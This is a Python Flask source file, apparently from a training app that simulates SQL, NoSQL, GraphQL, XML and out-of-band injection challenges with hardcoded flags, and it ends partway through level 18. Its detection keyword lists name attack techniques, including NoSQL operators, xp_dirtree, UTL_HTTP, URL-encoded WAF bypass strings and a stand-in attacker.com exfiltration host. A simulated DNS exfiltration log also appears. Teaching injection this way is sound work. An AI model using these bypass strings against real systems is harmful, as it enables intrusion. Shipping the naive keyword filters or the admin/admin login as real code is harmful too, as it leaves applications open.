def sqli_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    request_body = None
    response = None

    # Handle API request (POST)
    if request.method == 'POST':
        request_body = request.form.get('request_body', '')

        try:
            # Parse the JSON request body
            json_data = json.loads(request_body)

            # Extract parameters
            category = json_data.get('category', '')
            price = json_data.get('price', 0)
            in_stock = json_data.get('in_stock', False)

            # Check for SQL injection patterns in the category parameter
            sqli_patterns = ["'", "\"", "--", ";", "OR", "=", "UNION", "SELECT", "FROM", "WHERE", "DROP", "INSERT", "DELETE", "UPDATE"]

            # Convert to uppercase for case-insensitive check
            category_upper = category.upper() if isinstance(category, str) else ""
            price_str = str(price).upper()

            # Check if any SQL injection pattern is in the input
            for pattern in sqli_patterns:
                if pattern.upper() in category_upper or pattern.upper() in price_str:
                    # SQL injection detected!
                    sqli_detected = True
                    break

            # Simulate API response
            products = [
                {"id": 1, "name": "Smartphone Pro", "category": "Electronics", "price": 999.99, "description": "Latest smartphone with advanced features"},
                {"id": 2, "name": "Laptop Ultra", "category": "Electronics", "price": 1499.99, "description": "Powerful laptop for professionals"},
                {"id": 3, "name": "Wireless Earbuds", "category": "Electronics", "price": 199.99, "description": "Premium wireless earbuds with noise cancellation"}
            ]

            # Filter products based on category and price (simulating normal behavior)
            filtered_products = []
            for product in products:
                if (product['category'] == category or not category) and product['price'] <= price:
                    if not in_stock or (in_stock and product.get('stock', 10) > 0):
                        filtered_products.append(product)

            # If SQL injection is detected, add the hidden admin product
            if sqli_detected:
                admin_product = {
                    "id": 999,
                    "name": "Admin Console",
                    "category": "Restricted",
                    "price": 9999.99,
                    "description": "Administrative product with flag: R00T{r3st_4p1_sql1_1nj3ct10n_pwn3d}"
                }
                filtered_products.append(admin_product)

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="SQL Injection in REST API").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

            # Generate JSON response
            response = json.dumps({"products": filtered_products})

        except json.JSONDecodeError:
            response = json.dumps({"error": "Invalid JSON format"})
        except Exception as e:
            response = json.dumps({"error": str(e)})

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in REST API").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level9.html', flag=flag, sqli_detected=sqli_detected,
                          request_body=request_body, response=response)

# SQL Injection Level 10 - NoSQL Injection
@app.route('/sqli/level10', methods=['GET', 'POST'])
def sqli_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    error = None
    success = None
    documents = None

    # Handle login request (POST)
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # Check for NoSQL injection patterns
        nosql_patterns = ["$ne", "$gt", "$lt", "$regex", "$where", "$exists", "$elemMatch", "$nin", "$in", "$all", "$size", "$or", "$and", "$not"]

        # Check if any NoSQL injection pattern is in the input
        for pattern in nosql_patterns:
            if pattern in username or pattern in password:
                # NoSQL injection detected!
                sqli_detected = True
                break

        # Also check for JSON-like input that might contain NoSQL operators
        if (username.startswith('{') and username.endswith('}')) or (password.startswith('{') and password.endswith('}')):
            sqli_detected = True

        # Check for array notation that might be used for NoSQL injection
        if '[' in username or '[' in password:
            sqli_detected = True

        # Simulate authentication
        if sqli_detected:
            # NoSQL injection successful - simulate admin access
            success = "Welcome, admin! You have successfully logged in."

            # Show admin documents
            documents = [
                {
                    "id": "doc001",
                    "title": "System Architecture",
                    "category": "Technical",
                    "content": "Overview of the DocuStore system architecture and components.",
                    "created": "2023-01-15"
                },
                {
                    "id": "doc002",
                    "title": "Security Protocols",
                    "category": "Security",
                    "content": "Details of the security measures implemented in DocuStore.",
                    "created": "2023-02-20"
                },
                {
                    "id": "doc003",
                    "title": "Admin Credentials",
                    "category": "Confidential",
                    "content": "The flag is: R00T{n0sql_1nj3ct10n_byp4ss3d_4uth}",
                    "created": "2023-03-10"
                }
            ]

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="NoSQL Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
        elif username == "admin" and password == "admin":
            # Simulating a successful login with correct credentials (for testing)
            success = "Welcome, admin! You have successfully logged in."

            # Show admin documents
            documents = [
                {
                    "id": "doc001",
                    "title": "System Architecture",
                    "category": "Technical",
                    "content": "Overview of the DocuStore system architecture and components.",
                    "created": "2023-01-15"
                },
                {
                    "id": "doc002",
                    "title": "Security Protocols",
                    "category": "Security",
                    "content": "Details of the security measures implemented in DocuStore.",
                    "created": "2023-02-20"
                },
                {
                    "id": "doc003",
                    "title": "Admin Credentials",
                    "category": "Confidential",
                    "content": "The flag is: R00T{n0sql_1nj3ct10n_byp4ss3d_4uth}",
                    "created": "2023-03-10"
                }
            ]

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="NoSQL Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
        elif username == "user" and password == "password":
            # Simulating a successful login with regular user credentials
            success = "Welcome, user! You have successfully logged in."

            # Show regular user documents
            documents = [
                {
                    "id": "doc101",
                    "title": "User Guide",
                    "category": "Documentation",
                    "content": "Guide for using the DocuStore system.",
                    "created": "2023-01-20"
                },
                {
                    "id": "doc102",
                    "title": "Project Plan",
                    "category": "Project",
                    "content": "Project plan for implementing DocuStore.",
                    "created": "2023-02-25"
                }
            ]
        else:
            # Authentication failed
            error = "Invalid username or password. Please try again."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="NoSQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level10.html', flag=flag, sqli_detected=sqli_detected,
                          error=error, success=success, documents=documents)

# SQL Injection Level 11 - GraphQL Injection
@app.route('/sqli/level11', methods=['GET', 'POST'])
def sqli_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    query = None
    response = None

    # Handle GraphQL query (POST)
    if request.method == 'POST':
        query = request.form.get('query', '')

        # Check for GraphQL injection patterns
        graphql_patterns = ["__schema", "__type", "introspection", "getPost(id: 999", "isPrivate", "admin"]

        # Check if any GraphQL injection pattern is in the input
        for pattern in graphql_patterns:
            if pattern in query:
                # GraphQL injection detected!
                sqli_detected = True
                break

        # Simulate GraphQL query execution
        if "getPost(id: 1)" in query:
            # Regular public post
            response = '''
{
  "data": {
    "getPost": {
      "id": "1",
      "title": "Getting Started with GraphQL",
      "content": "GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data.",
      "author": {
        "name": "John Doe"
      }
    }
  }
}
'''
        elif "getPost(id: 2)" in query:
            # Another public post
            response = '''
{
  "data": {
    "getPost": {
      "id": "2",
      "title": "Advanced GraphQL Techniques",
      "content": "Learn how to use fragments, variables, and directives in GraphQL to make your queries more efficient.",
      "author": {
        "name": "Jane Smith"
      }
    }
  }
}
'''
        elif "getPosts" in query:
            # List of posts
            response = '''
{
  "data": {
    "getPosts": [
      {
        "id": "1",
        "title": "Getting Started with GraphQL",
        "isPrivate": false
      },
      {
        "id": "2",
        "title": "Advanced GraphQL Techniques",
        "isPrivate": false
      },
      {
        "id": "3",
        "title": "GraphQL Security Best Practices",
        "isPrivate": false
      },
      {
        "id": "999",
        "title": "Admin Notes",
        "isPrivate": true
      }
    ]
  }
}
'''
        elif "__schema" in query or "__type" in query:
            # Introspection query
            response = '''
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {
              "name": "getPost",
              "type": {
                "name": "Post",
                "kind": "OBJECT"
              }
            },
            {
              "name": "getPosts",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            },
            {
              "name": "searchPosts",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            }
          ]
        },
        {
          "name": "Post",
          "fields": [
            {
              "name": "id",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "title",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "content",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "isPrivate",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "author",
              "type": {
                "name": "User",
                "kind": "OBJECT"
              }
            }
          ]
        }
      ]
    }
  }
}
'''
        elif "getPost(id: 999)" in query and "isPrivate" in query:
            # Private admin post with the flag - successful exploitation
            response = '''
{
  "data": {
    "getPost": {
      "id": "999",
      "title": "Admin Notes",
      "content": "Security audit scheduled for next week. Flag: R00T{gr4phql_1nj3ct10n_3xpl01t3d}",
      "isPrivate": true,
      "author": {
        "name": "Admin",
        "role": "ADMIN"
      }
    }
  }
}
'''

            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="GraphQL Injection").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
        else:
            # Default response for other queries
            response = '''
{
  "data": null,
  "errors": [
    {
      "message": "Invalid query. Please check your syntax and try again."
    }
  ]
}
'''

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="GraphQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level11.html', flag=flag, sqli_detected=sqli_detected,
                          query=query, response=response)

# SQL Injection Level 12 - ORM-based SQL Injection
@app.route('/sqli/level12', methods=['GET', 'POST'])
def sqli_level12():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    department = request.form.get('department', 'IT')
    search_term = request.form.get('search_term', '')
    employees = []
    error = None

    # Default employees for each department
    default_employees = {
        "IT": [
            {
                "id": "IT001",
                "name": "John Smith",
                "position": "IT Manager",
                "department": "IT",
                "email": "john.smith@corphr.com",
                "phone": "555-1234",
                "salary": "85,000",
                "joined": "2018-05-15"
            },
            {
                "id": "IT002",
                "name": "Sarah Johnson",
                "position": "Senior Developer",
                "department": "IT",
                "email": "sarah.johnson@corphr.com",
                "phone": "555-2345",
                "salary": "78,000",
                "joined": "2019-02-10"
            },
            {
                "id": "IT003",
                "name": "Michael Chen",
                "position": "System Administrator",
                "department": "IT",
                "email": "michael.chen@corphr.com",
                "phone": "555-3456",
                "salary": "72,000",
                "joined": "2020-07-22"
            }
        ],
        "HR": [
            {
                "id": "HR001",
                "name": "Emily Davis",
                "position": "HR Director",
                "department": "HR",
                "email": "emily.davis@corphr.com",
                "phone": "555-4567",
                "salary": "92,000",
                "joined": "2017-11-05"
            },
            {
                "id": "HR002",
                "name": "Robert Wilson",
                "position": "Recruitment Specialist",
                "department": "HR",
                "email": "robert.wilson@corphr.com",
                "phone": "555-5678",
                "salary": "65,000",
                "joined": "2021-03-18"
            }
        ],
        "Finance": [
            {
                "id": "FIN001",
                "name": "Jennifer Lee",
                "position": "Finance Manager",
                "department": "Finance",
                "email": "jennifer.lee@corphr.com",
                "phone": "555-6789",
                "salary": "95,000",
                "joined": "2016-09-30"
            },
            {
                "id": "FIN002",
                "name": "David Brown",
                "position": "Senior Accountant",
                "department": "Finance",
                "email": "david.brown@corphr.com",
                "phone": "555-7890",
                "salary": "82,000",
                "joined": "2018-12-07"
            }
        ],
        "Marketing": [
            {
                "id": "MKT001",
                "name": "Lisa Taylor",
                "position": "Marketing Director",
                "department": "Marketing",
                "email": "lisa.taylor@corphr.com",
                "phone": "555-8901",
                "salary": "90,000",
                "joined": "2019-04-15"
            }
        ],
        "Sales": [
            {
                "id": "SLS001",
                "name": "James Anderson",
                "position": "Sales Manager",
                "department": "Sales",
                "email": "james.anderson@corphr.com",
                "phone": "555-9012",
                "salary": "88,000",
                "joined": "2017-06-22"
            }
        ],
        "Executive": [
            {
                "id": "EXE001",
                "name": "Elizabeth Williams",
                "position": "CEO",
                "department": "Executive",
                "email": "elizabeth.williams@corphr.com",
                "phone": "555-0123",
                "salary": "250,000 (Flag: R00T{0rm_sql1_1nj3ct10n_byp4ss3d})",
                "joined": "2015-01-01"
            }
        ]
    }

    # Handle search request (POST)
    if request.method == 'POST':
        # Check for SQL injection patterns in the search term
        sqli_patterns = ["'", "\"", "--", ";", "OR", "=", "UNION", "SELECT", "FROM", "WHERE", "DROP", "INSERT", "DELETE", "UPDATE"]

        # Convert to uppercase for case-insensitive check
        search_term_upper = search_term.upper() if isinstance(search_term, str) else ""

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in search_term_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Simulate ORM-based search
        if department in default_employees:
            if sqli_detected:
                # SQL injection successful - show all employees including the CEO
                for dept in default_employees:
                    employees.extend(default_employees[dept])

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="ORM-based SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            elif search_term:
                # Normal search - filter employees by department and search term
                for employee in default_employees[department]:
                    if search_term.lower() in employee["name"].lower() or search_term.lower() in employee["position"].lower():
                        employees.append(employee)

                if not employees:
                    error = f"No employees found in {department} department matching '{search_term}'."
            else:
                # No search term - show all employees in the selected department
                employees = default_employees[department]
        else:
            error = "Invalid department selected."
    else:
        # Default view - show IT department employees
        employees = default_employees["IT"]

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="ORM-based SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level12.html', flag=flag, sqli_detected=sqli_detected,
                          department=department, search_term=search_term, employees=employees, error=error)

# SQL Injection Level 13 - Out-of-band SQL Injection
@app.route('/sqli/level13', methods=['GET', 'POST'])
def sqli_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    search_term = request.form.get('search_term', '')
    stocks = []
    error = None
    dns_logs = []

    # Default stocks
    default_stocks = [
        {
            "symbol": "AAPL",
            "name": "Apple Inc.",
            "price": "182.63",
            "change": 1.25
        },
        {
            "symbol": "MSFT",
            "name": "Microsoft Corporation",
            "price": "337.22",
            "change": 0.87
        },
        {
            "symbol": "GOOGL",
            "name": "Alphabet Inc.",
            "price": "131.86",
            "change": -0.32
        },
        {
            "symbol": "AMZN",
            "name": "Amazon.com, Inc.",
            "price": "127.74",
            "change": 0.56
        },
        {
            "symbol": "TSLA",
            "name": "Tesla, Inc.",
            "price": "237.49",
            "change": -1.45
        }
    ]

    # Handle search request (POST)
    if request.method == 'POST':
        # Check for SQL injection patterns in the search term
        sqli_patterns = ["'", "\"", "--", ";", "UNION", "SELECT", "FROM", "WHERE", "DROP", "INSERT", "DELETE", "UPDATE",
                         "LOAD_FILE", "UTL_HTTP", "xp_dirtree", "sp_OAMethod", "UTL_INADDR", "attacker.com"]

        # Convert to uppercase for case-insensitive check
        search_term_upper = search_term.upper() if isinstance(search_term, str) else ""

        # Check if any SQL injection pattern is in the input
        for pattern in sqli_patterns:
            if pattern.upper() in search_term_upper:
                # SQL injection detected!
                sqli_detected = True
                break

        # Simulate stock search
        if search_term:
            if sqli_detected:
                # SQL injection successful - simulate DNS exfiltration
                dns_logs = [
                    {
                        "timestamp": "2023-07-15 14:32:18",
                        "query": "db-server.local",
                        "type": "A",
                        "source": "192.168.1.10"
                    },
                    {
                        "timestamp": "2023-07-15 14:32:19",
                        "query": "R00T{0ut_0f_b4nd_sql1_3xf1ltr4t10n}.attacker.com",
                        "type": "A",
                        "source": "192.168.1.10"
                    }
                ]

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Out-of-band SQL Injection").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

                # Return all stocks for the search results
                stocks = default_stocks
            else:
                # Normal search - filter stocks by symbol or name
                for stock in default_stocks:
                    if search_term.upper() in stock["symbol"].upper() or search_term.lower() in stock["name"].lower():
                        stocks.append(stock)

                if not stocks:
                    error = f"No stocks found matching '{search_term}'."
        else:
            # No search term - show all stocks
            stocks = default_stocks
    else:
        # Default view - show all stocks
        stocks = default_stocks

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Out-of-band SQL Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level13.html', flag=flag, sqli_detected=sqli_detected,
                          search_term=search_term, stocks=stocks, error=error, dns_logs=dns_logs)

# SQL Injection Level 14 - SQL Injection with Advanced WAF Bypass
@app.route('/sqli/level14', methods=['GET', 'POST'])
def sqli_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    category = request.form.get('category', 'Electronics')
    search_term = request.form.get('search_term', '')
    products = []
    error = None
    waf_blocked = False
    waf_logs = []

    if request.method == 'POST':
        # WAF implementation
        def waf_check(input_str):
            blocked_patterns = [
                'SELECT', 'UNION', 'FROM', 'WHERE',
                '--', '/*', "'", '"',
                '=', '>', '<'
            ]

            # Check if any blocked pattern is in the input (case-insensitive)
            for pattern in blocked_patterns:
                if pattern.upper() in input_str.upper():
                    # Log the WAF block
                    import datetime
                    waf_logs.append({
                        'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'rule_id': blocked_patterns.index(pattern) + 1,
                        'rule_name': f"Blocked pattern: {pattern}",
                        'action': 'BLOCK',
                        'ip': request.remote_addr
                    })
                    return True
            return False

        # Check if the input contains SQL injection patterns
        if waf_check(category) or waf_check(search_term):
            waf_blocked = True
        else:
            # Simulate database query
            if category == 'Electronics':
                products = [
                    {"id": 1, "name": "Smartphone X", "category": "Electronics", "price": 999.99, "description": "Latest smartphone with advanced features."},
                    {"id": 2, "name": "Laptop Pro", "category": "Electronics", "price": 1499.99, "description": "Professional laptop for developers."},
                    {"id": 3, "name": "Wireless Headphones", "category": "Electronics", "price": 199.99, "description": "Noise-cancelling wireless headphones."}
                ]
            elif category == 'Clothing':
                products = [
                    {"id": 4, "name": "Designer T-shirt", "category": "Clothing", "price": 49.99, "description": "Premium cotton t-shirt."},
                    {"id": 5, "name": "Jeans", "category": "Clothing", "price": 79.99, "description": "Comfortable denim jeans."},
                    {"id": 6, "name": "Sneakers", "category": "Clothing", "price": 129.99, "description": "Stylish and comfortable sneakers."}
                ]

            # Check for advanced WAF bypass attempts
            advanced_bypass_patterns = [
                '%27', '%2527', '%252527',  # URL encoded single quotes
                'un%69on', 'un%69%6fn', 'un%2569on',  # URL encoded UNION
                'se%6cect', 'se%6c%65ct', 'se%2565ct',  # URL encoded SELECT
                'concat(0x', 'char(', 'hex(',  # Alternative string functions
                '0x3', '0x4', '0x5',  # Hex values
                'product%5fid',  # URL encoded underscore
                'or%20product%5fid%3d999'  # Encoded OR condition
            ]

            for pattern in advanced_bypass_patterns:
                if pattern in category.lower() or pattern in search_term.lower():
                    # Advanced WAF bypass detected!
                    sqli_detected = True

                    # Add the restricted product (with the flag)
                    products.append({
                        "id": 999,
                        "name": "Restricted Product",
                        "category": "ADMIN",
                        "price": 9999.99,
                        "description": "This product contains the flag: R00T{4dv4nc3d_w4f_byp4ss_m4st3r}"
                    })

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SQL Injection with Advanced WAF Bypass").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection with Advanced WAF Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level14.html', flag=flag, sqli_detected=sqli_detected,
                          category=category, search_term=search_term, products=products,
                          error=error, waf_blocked=waf_blocked, waf_logs=waf_logs)

# SQL Injection Level 15 - SQL Injection via XML
@app.route('/sqli/level15', methods=['GET', 'POST'])
def sqli_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    xml_data = None
    reports = []
    error = None

    if request.method == 'POST':
        xml_data = request.form.get('xml_data', '')

        # Check if the XML is well-formed
        try:
            import xml.etree.ElementTree as ET
            root = ET.fromstring(xml_data)

            # Extract values from XML
            report_type = root.find('type').text if root.find('type') is not None else ''
            report_period = root.find('period').text if root.find('period') is not None else ''
            report_department = root.find('department').text if root.find('department') is not None else ''

            # Check for SQL injection patterns in XML values
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "="]

            for pattern in sqli_patterns:
                if (pattern in report_type or pattern in report_period or pattern in report_department):
                    # SQL injection detected!
                    sqli_detected = True

                    # Add the restricted report (with the flag)
                    reports.append({
                        "id": 999,
                        "title": "Restricted Financial Report",
                        "type": "confidential",
                        "period": "annual",
                        "department": "executive",
                        "data": "This report contains the flag: R00T{xml_sql1_1nj3ct10n_3xpl01t3d}"
                    })

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SQL Injection via XML").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break

            # If no SQL injection detected, return normal reports
            if not sqli_detected:
                if report_type == 'sales':
                    reports = [
                        {"id": 1, "title": "Sales Report Q1", "type": "sales", "period": "quarterly", "department": report_department, "data": "Sales increased by 15% in Q1."},
                        {"id": 2, "title": "Sales Report Q2", "type": "sales", "period": "quarterly", "department": report_department, "data": "Sales increased by 10% in Q2."}
                    ]
                elif report_type == 'inventory':
                    reports = [
                        {"id": 3, "title": "Inventory Status", "type": "inventory", "period": report_period, "department": report_department, "data": "Current inventory levels are optimal."},
                        {"id": 4, "title": "Inventory Forecast", "type": "inventory", "period": report_period, "department": report_department, "data": "Inventory forecast for next quarter is stable."}
                    ]
                elif report_type == 'marketing':
                    reports = [
                        {"id": 5, "title": "Marketing Campaign Results", "type": "marketing", "period": report_period, "department": report_department, "data": "Recent campaign resulted in 20% increase in leads."},
                        {"id": 6, "title": "Marketing Budget", "type": "marketing", "period": report_period, "department": report_department, "data": "Marketing budget allocation for next quarter."}
                    ]
        except Exception as e:
            error = f"Error processing XML: {str(e)}"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection via XML").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level15.html', flag=flag, sqli_detected=sqli_detected,
                          xml_data=xml_data, reports=reports, error=error)

# SQL Injection Level 16 - SQL Injection in WebSockets
@app.route('/sqli/level16', methods=['GET', 'POST'])
def sqli_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    ws_message = None

    if request.method == 'POST':
        # Handle AJAX request from the WebSocket simulation
        if request.is_json:
            data = request.get_json()
            sqli_detected = data.get('sqli_detected', False)
            ws_message = data.get('ws_message', '')

            # Mark challenge as completed if SQL injection is detected
            if sqli_detected:
                challenge = Challenge.query.filter_by(name="SQL Injection in WebSockets").first()
                if challenge:
                    # Add challenge to completed challenges
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

                    return jsonify({"success": True})
                return jsonify({"success": False, "error": "Challenge not found"})

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in WebSockets").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level16.html', flag=flag, sqli_detected=sqli_detected,
                          ws_message=ws_message)

# SQL Injection Level 17 - SQL Injection in Mobile App Backend
@app.route('/sqli/level17', methods=['GET', 'POST'])
def sqli_level17():
    import json
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    api_request = None
    api_response = None

    if request.method == 'POST':
        api_request = request.form.get('api_request', '')

        try:
            # Parse the API request JSON
            data = json.loads(api_request)

            # Extract values from the request
            action = data.get('action', '')
            category = data.get('category', '')
            sort = data.get('sort', 'price_asc')
            limit = data.get('limit', 10)
            search = data.get('search', '')

            # Check for SQL injection patterns
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]

            # Check if any SQL injection pattern is in the input
            for pattern in sqli_patterns:
                if (pattern in category or pattern in sort or pattern in str(search)):
                    # SQL injection detected!
                    sqli_detected = True

                    # Return the restricted product (with the flag)
                    api_response = json.dumps({
                        "status": "success",
                        "products": [
                            {
                                "id": 999,
                                "name": "Restricted Product",
                                "description": "This product contains the flag: R00T{m0b1l3_4pp_b4ck3nd_sql1_pwn3d}",
                                "price": 9999.99,
                                "category": "RESTRICTED"
                            }
                        ]
                    }, indent=2)

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SQL Injection in Mobile App Backend").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break

            # If no SQL injection detected, return normal products
            if not sqli_detected:
                products = []

                if category.lower() == 'electronics':
                    products = [
                        {"id": 1, "name": "Smartphone X", "description": "Latest smartphone with advanced features.", "price": 999.99, "category": "Electronics"},
                        {"id": 2, "name": "Laptop Pro", "description": "Professional laptop for developers.", "price": 1499.99, "category": "Electronics"},
                        {"id": 3, "name": "Wireless Headphones", "description": "Noise-cancelling wireless headphones.", "price": 199.99, "category": "Electronics"}
                    ]
                elif category.lower() == 'clothing':
                    products = [
                        {"id": 4, "name": "Designer T-shirt", "description": "Premium cotton t-shirt.", "price": 49.99, "category": "Clothing"},
                        {"id": 5, "name": "Jeans", "description": "Comfortable denim jeans.", "price": 79.99, "category": "Clothing"},
                        {"id": 6, "name": "Sneakers", "description": "Stylish and comfortable sneakers.", "price": 129.99, "category": "Clothing"}
                    ]

                # Apply search filter if provided
                if search:
                    products = [p for p in products if search.lower() in p['name'].lower() or search.lower() in p['description'].lower()]

                # Sort products
                if sort == 'price_asc':
                    products.sort(key=lambda p: p['price'])
                elif sort == 'price_desc':
                    products.sort(key=lambda p: p['price'], reverse=True)
                elif sort == 'name_asc':
                    products.sort(key=lambda p: p['name'])
                elif sort == 'name_desc':
                    products.sort(key=lambda p: p['name'], reverse=True)

                # Apply limit
                products = products[:limit]

                api_response = json.dumps({
                    "status": "success",
                    "products": products
                }, indent=2)

        except Exception as e:
            api_response = json.dumps({
                "status": "error",
                "message": str(e)
            }, indent=2)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in Mobile App Backend").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level17.html', flag=flag, sqli_detected=sqli_detected,
                          api_request=api_request, api_response=api_response)

# SQL Injection Level 18 - SQL Injection in Cloud Functions
@app.route('/sqli/level18', methods=['GET', 'POST'])
def sqli_level18():
    import json
    import random
    import datetime
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    event_data = None
    function_response = None
    function_duration = None
    function_memory = None
    function_status = None
    function_logs = []

    if request.method == 'POST':
        event_data = request.form.get('event_data', '')

        try:
            # Parse the event data JSON
            data = json.loads(event_data)

            # Extract values from the event
            action = data.get('action', '')
            dataset = data.get('dataset', '')
            filter_condition = data.get('filter', '')
            format_type = data.get('format', 'json')

            # Simulate function execution
            start_time = datetime.datetime.now()

            # Add execution logs
            function_logs.append({
                'timestamp': start_time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'level': 'info',
                'message': f"Function execution started with event: {json.dumps(data)}"
            })

            function_logs.append({
                'timestamp': (start_time + datetime.timedelta(milliseconds=50)).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'level': 'info',
                'message': f"Connecting to database..."
            })

            # Check for SQL injection patterns
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]

            # Generate simulated SQL query
            sql_query = f"SELECT * FROM {dataset} WHERE {filter_condition} LIMIT 1000"

            function_logs.append({
                'timestamp': (start_time + datetime.timedelta(milliseconds=100)).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'level': 'info',
                'message': f"Executing query: {sql_query}"
            })

            # Check if any SQL injection pattern is in the dataset or filter
            for pattern in sqli_patterns:
                if (pattern in dataset or pattern in filter_condition):
                    # SQL injection detected!
                    sqli_detected = True

                    function_logs.append({
